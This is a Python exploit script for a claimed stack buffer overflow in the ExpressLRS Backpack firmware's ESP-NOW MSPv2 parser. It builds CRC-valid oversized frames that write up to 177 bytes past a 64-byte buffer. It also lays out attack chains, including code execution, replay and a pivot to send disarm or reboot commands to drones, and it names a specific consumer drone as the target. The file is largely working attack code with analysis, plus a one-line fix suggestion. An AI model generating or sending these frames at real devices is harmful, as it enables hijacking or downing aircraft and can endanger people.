#!/usr/bin/env python3
"""
ESP-NOW Backpack Stack Overflow — MSPv2 payload length exploitation

The ExpressLRS Backpack firmware (v1.5.9 and current master) has a
confirmed stack buffer overflow in its ESP-NOW receive callback path.

Vulnerability (lib/MSP/msp.cpp, lib/MSP/msp.h):
  - MSP class declares a 64-byte payload buffer (MSP_PORT_INBUF_SIZE)
  - MSPv2 parser accepts a 16-bit payload length from the wire
  - No bounds check before storing payload bytes
  - Parser writes ALL declared payload bytes before CRC validation
  - Source-MAC comparison occurs AFTER complete packet parsing

Attack surface:
  - ESP-NOW v1.0 allows 250-byte frames
  - MSPv2 framing uses 9 bytes (header + CRC)
  - Maximum payload in one ESP-NOW frame: 241 bytes
  - Array capacity: 64 bytes
  - Out-of-bounds writes: up to 177 bytes past the buffer

  Both "safety" gates fire too late:
  1. CRC check: runs after all payload bytes are stored → too late
  2. Source MAC check: runs after full packet parse → too late

Offline confirmation:
  - Reproduced with unmodified parser source under ASan/UBSan
  - ASan reports first invalid index at msp.cpp:102
  - Heap-buffer-overflow after 156+ bytes written
  - The main ELRS repo already fixed this (commit 1ade76d)
  - The Backpack fork has NOT incorporated the fix

Relevance to TinyHawk III Plus + E8:
  - Whether the E8 controller contains an ELRS Backpack ESP co-processor
    is UNCONFIRMED — requires passive WiFi/BLE scan during E8 operation
  - If present: ESP-NOW is unencrypted, broadcast reachable from WiFi range
  - Targets: ESP8285, ESP32, ESP32-C3 across FPV vendor products

CVE references:
  - CVE-2024-42483: ESP-NOW replay (no sequence numbers, no encryption)
  - CVE-2025-52471: ESP-NOW integer underflow RCE (CVSS 9.8)

Usage:
  python3 espnow-backpack-overflow.py --analyze
  python3 espnow-backpack-overflow.py --generate-payload
  python3 espnow-backpack-overflow.py --chain

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# ESP-NOW / MSPv2 constants
# ---------------------------------------------------------------------------

# ESP-NOW
ESPNOW_MAX_FRAME = 250       # ESP-NOW v1.0 maximum payload
ESPNOW_ENCRYPTION = False    # Backpack sets encryption to false

# MSPv2 framing
MSPV2_HEADER = b'$X<'        # MSPv2 command header
MSPV2_FRAMING_OVERHEAD = 9   # header(3) + flags(1) + function(2) + payload_size(2) + crc(1)
MSPV2_MAX_PAYLOAD_IN_ESPNOW = ESPNOW_MAX_FRAME - MSPV2_FRAMING_OVERHEAD  # 241

# Backpack MSP buffer
MSP_PORT_INBUF_SIZE = 64     # lib/MSP/msp.h buffer declaration
OOB_WRITE_MAX = MSPV2_MAX_PAYLOAD_IN_ESPNOW - MSP_PORT_INBUF_SIZE  # 177

# Target architectures
TARGET_ARCHS = {
    "ESP8285": {
        "core": "Xtensa LX106",
        "stack_direction": "grows down",
        "word_size": 4,
        "has_mmu": False,
        "stack_canaries": "None by default (Arduino framework)",
        "notes": "Single-core, 80/160 MHz, 96KB data RAM",
    },
    "ESP32": {
        "core": "Xtensa LX6 (dual-core)",
        "stack_direction": "grows down",
        "word_size": 4,
        "has_mmu": True,  # but no ASLR
        "stack_canaries": "Optional (CONFIG_COMPILER_STACK_CHECK)",
        "notes": "Dual-core 240 MHz, 520KB SRAM, WiFi+BT+BLE",
    },
    "ESP32-C3": {
        "core": "RISC-V (single-core)",
        "stack_direction": "grows down",
        "word_size": 4,
        "has_mmu": False,
        "stack_canaries": "Optional (CONFIG_COMPILER_STACK_CHECK)",
        "notes": "Single-core 160 MHz, 400KB SRAM, WiFi+BLE",
    },
}


def crc8_dvbs2(data: bytes) -> int:
    """CRC-8/DVB-S2 used by MSPv2."""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def build_mspv2_frame(function: int, payload: bytes, flags: int = 0) -> bytes:
    """Build an MSPv2 frame with the given payload.

    MSPv2 format: $X< [flags:1] [function:2LE] [payload_size:2LE] [payload] [crc:1]
    CRC covers flags through end of payload.
    """
    payload_size = len(payload)
    header = MSPV2_HEADER
    meta = struct.pack('<BHH', flags, function, payload_size)
    crc_data = meta + payload
    crc = crc8_dvbs2(crc_data)
    return header + crc_data + bytes([crc])


def build_overflow_payload(overflow_size: int = 177,
                           fill_byte: int = 0x41,
                           function: int = 0x0001) -> dict:
    """Build an MSPv2 frame that overflows the 64-byte buffer.

    The payload is sized to cause the specified number of OOB writes.
    """
    total_payload = MSP_PORT_INBUF_SIZE + overflow_size
    if total_payload > MSPV2_MAX_PAYLOAD_IN_ESPNOW:
        total_payload = MSPV2_MAX_PAYLOAD_IN_ESPNOW
        overflow_size = total_payload - MSP_PORT_INBUF_SIZE

    payload = bytes([fill_byte]) * total_payload
    frame = build_mspv2_frame(function, payload)

    return {
        "frame_hex": frame.hex(),
        "frame_size": len(frame),
        "payload_declared_size": total_payload,
        "buffer_capacity": MSP_PORT_INBUF_SIZE,
        "oob_writes": overflow_size,
        "oob_bytes": overflow_size,
        "fill_byte": f"0x{fill_byte:02x}",
        "fits_in_espnow": len(frame) <= ESPNOW_MAX_FRAME,
        "crc_valid": True,  # CRC is computed correctly, but doesn't prevent overflow
        "note": "CRC validation occurs AFTER all payload bytes are stored",
    }


def analyze_vulnerability():
    """Detailed analysis of the ESP-NOW Backpack overflow."""
    print(f"\n{'='*65}")
    print("ESP-NOW BACKPACK STACK OVERFLOW ANALYSIS")
    print(f"{'='*65}")

    print(f"\n  Buffer: MSP::m_inputBuf[{MSP_PORT_INBUF_SIZE}] (lib/MSP/msp.h)")
    print(f"  Parser: msp.cpp — stores bytes at m_inputBuf[m_offset++]")
    print(f"  No bounds check on m_offset vs MSP_PORT_INBUF_SIZE")

    print(f"\n  ESP-NOW frame budget:")
    print(f"    Maximum ESP-NOW payload: {ESPNOW_MAX_FRAME} bytes")
    print(f"    MSPv2 framing overhead:  {MSPV2_FRAMING_OVERHEAD} bytes")
    print(f"    Available for payload:   {MSPV2_MAX_PAYLOAD_IN_ESPNOW} bytes")
    print(f"    Buffer capacity:         {MSP_PORT_INBUF_SIZE} bytes")
    print(f"    Maximum OOB writes:      {OOB_WRITE_MAX} bytes")

    print(f"\n  Race condition (both gates fire too late):")
    print(f"    1. CRC validation:  After ALL payload bytes stored  → overflow done")
    print(f"    2. Source MAC check: After full packet parsed        → overflow done")
    print(f"    The overflow is complete before any validation runs.")

    print(f"\n  ESP-NOW link-layer security:")
    print(f"    Encryption: {'DISABLED' if not ESPNOW_ENCRYPTION else 'ENABLED'}")
    print(f"    Authentication: None (broadcast reachable)")
    print(f"    Replay protection: None (no sequence numbers)")
    print(f"    Range: WiFi range (~100m outdoor, ~30m indoor)")

    print(f"\n  Fix status:")
    print(f"    Main ELRS repo: FIXED (commit 1ade76d — rejects size > 64)")
    print(f"    Backpack fork:  UNFIXED (v1.5.9 and current master)")
    print(f"    The fix is a single bounds check before the write loop.")


def analyze_targets():
    """Analyze target architectures for exploitation potential."""
    print(f"\n{'='*65}")
    print("TARGET ARCHITECTURE ANALYSIS")
    print(f"{'='*65}")

    for name, info in TARGET_ARCHS.items():
        print(f"\n  {name}:")
        print(f"    Core:          {info['core']}")
        print(f"    Stack:         {info['stack_direction']}")
        print(f"    Word size:     {info['word_size']} bytes")
        print(f"    MMU:           {'Yes' if info['has_mmu'] else 'No'} (no ASLR regardless)")
        print(f"    Stack canaries: {info['stack_canaries']}")
        print(f"    Notes:         {info['notes']}")

    print(f"\n  Exploitation considerations:")
    print(f"    - All targets: no ASLR, predictable memory layout")
    print(f"    - Stack canaries optional, typically disabled in Arduino builds")
    print(f"    - Xtensa (ESP8285/ESP32): non-standard ISA, custom calling convention")
    print(f"    - RISC-V (ESP32-C3): standard RISC-V calling convention")
    print(f"    - Each target needs separate exploit development (different ABIs)")
    print(f"    - ESP-NOW callback runs in WiFi task context")


def analyze_chain():
    """Analyze the full ESP-NOW attack chain."""
    print(f"\n{'='*65}")
    print("ESP-NOW ATTACK CHAINS")
    print(f"{'='*65}")

    chains = [
        {
            "name": "A: Stack overflow → code execution",
            "prereq": "Target has ELRS Backpack ESP co-processor",
            "steps": [
                "Craft MSPv2 frame with payload_size > 64",
                "Transmit via ESP-NOW broadcast (unencrypted, no auth)",
                "Parser stores all bytes → overflow past m_inputBuf[64]",
                "Overwrites saved return address / register file on stack",
                "Return from callback → controlled PC → code execution",
            ],
            "status": "Offline-confirmed memory corruption; RCE not yet demonstrated",
        },
        {
            "name": "B: ESP-NOW replay attack (CVE-2024-42483)",
            "prereq": "Can capture legitimate ESP-NOW frames",
            "steps": [
                "Capture Backpack ESP-NOW frames (WiFi monitor mode)",
                "No sequence numbers or encryption to prevent replay",
                "Retransmit captured frames at will",
                "Backpack processes replayed commands as legitimate",
            ],
            "status": "Protocol-level vulnerability, trivially exploitable",
        },
        {
            "name": "C: Integer underflow RCE (CVE-2025-52471, CVSS 9.8)",
            "prereq": "Target has ESP-IDF-based ESP-NOW handler",
            "steps": [
                "Craft ESP-NOW frame triggering integer underflow in length calc",
                "Underflow causes massive memcpy or buffer overflow",
                "Corrupts heap metadata or stack frames",
                "Achieve code execution on the ESP processor",
            ],
            "status": "CVE assigned, CVSS 9.8, affects ESP-IDF-based devices",
        },
        {
            "name": "D: Backpack → ELRS TX → Drone pivot",
            "prereq": "Code execution on Backpack ESP",
            "steps": [
                "Backpack has serial/SPI connection to ELRS TX module",
                "Inject CRSF/MSP commands through the internal bus",
                "ELRS TX forwards to drone over OTA link",
                "Drone executes injected MSP commands (disarm, reboot, etc.)",
            ],
            "status": "Theoretical pivot path — requires code execution on Backpack",
        },
    ]

    for chain in chains:
        print(f"\n  Chain {chain['name']}:")
        print(f"    Prerequisite: {chain['prereq']}")
        for i, step in enumerate(chain["steps"], 1):
            print(f"    {i}. {step}")
        print(f"    Status: {chain['status']}")


def main():
    parser = argparse.ArgumentParser(
        description="ESP-NOW Backpack Stack Overflow — MSPv2 payload exploitation"
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Detailed vulnerability analysis",
    )
    parser.add_argument(
        "--targets", action="store_true",
        help="Analyze target architectures",
    )
    parser.add_argument(
        "--generate-payload", action="store_true",
        help="Generate overflow MSPv2 frame",
    )
    parser.add_argument(
        "--overflow-size", type=int, default=177,
        help="Bytes to overflow past buffer (max 177, default: 177)",
    )
    parser.add_argument(
        "--chain", action="store_true",
        help="Analyze full attack chains",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    print("ESP-NOW Backpack Stack Overflow")
    print(f"Buffer: MSP::m_inputBuf[{MSP_PORT_INBUF_SIZE}]")
    print(f"Max ESP-NOW payload: {ESPNOW_MAX_FRAME} bytes")
    print(f"Max OOB writes: {OOB_WRITE_MAX} bytes ({OOB_WRITE_MAX / MSP_PORT_INBUF_SIZE:.1f}x buffer)")
    print(f"Backpack fix status: UNFIXED (v1.5.9 + master)")

    results = {
        "buffer_size": MSP_PORT_INBUF_SIZE,
        "espnow_max": ESPNOW_MAX_FRAME,
        "max_oob_writes": OOB_WRITE_MAX,
        "backpack_fixed": False,
        "main_elrs_fixed": True,
    }

    if args.analyze:
        analyze_vulnerability()
        results["mode"] = "analyze"

    if args.targets:
        analyze_targets()
        results["targets"] = TARGET_ARCHS
        results["mode"] = "targets"

    if args.generate_payload:
        overflow = min(args.overflow_size, OOB_WRITE_MAX)
        payload = build_overflow_payload(overflow_size=overflow)

        print(f"\n{'='*65}")
        print(f"OVERFLOW PAYLOAD — {overflow} bytes past buffer")
        print(f"{'='*65}")
        print(f"  Frame ({payload['frame_size']} bytes): {payload['frame_hex'][:80]}...")
        print(f"  Declared payload size: {payload['payload_declared_size']}")
        print(f"  Buffer capacity: {payload['buffer_capacity']}")
        print(f"  OOB writes: {payload['oob_writes']} bytes")
        print(f"  Fits in ESP-NOW: {payload['fits_in_espnow']}")
        print(f"  CRC valid: {payload['crc_valid']}")
        print(f"  Note: {payload['note']}")

        results["payload"] = payload
        results["mode"] = "generate-payload"

    if args.chain:
        analyze_chain()
        results["mode"] = "chain"

    if not any([args.analyze, args.targets, args.generate_payload, args.chain]):
        analyze_vulnerability()
        analyze_targets()
        analyze_chain()

    # Assessment
    print(f"\n{'='*65}")
    print("ASSESSMENT")
    print(f"{'='*65}")
    print("  The Backpack ESP-NOW overflow is a confirmed, unfixed memory")
    print("  corruption vulnerability reachable via broadcast WiFi-range")
    print("  frames. The main ELRS repo fixed it; the Backpack fork did not.")
    print()
    print("  Combined with CVE-2024-42483 (replay) and CVE-2025-52471")
    print("  (integer underflow RCE, CVSS 9.8), the ESP-NOW attack surface")
    print("  is the highest-risk wireless entry point for any ELRS system")
    print("  with a Backpack co-processor.")
    print()
    print("  For the TinyHawk III Plus + E8 specifically:")
    print("  - Whether the E8 has a Backpack ESP is UNCONFIRMED")
    print("  - A passive WiFi + BLE scan during E8 operation is needed")
    print("  - If present: the entire overflow + pivot chain applies")
    print("  - If absent: these CVEs don't apply to this specific target")
    print()
    print("  The fix is trivial: add `if (payload_size > MSP_PORT_INBUF_SIZE)")
    print("  return;` before the write loop. That it hasn't been applied to")
    print("  the Backpack after the main repo fix is a maintenance gap.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
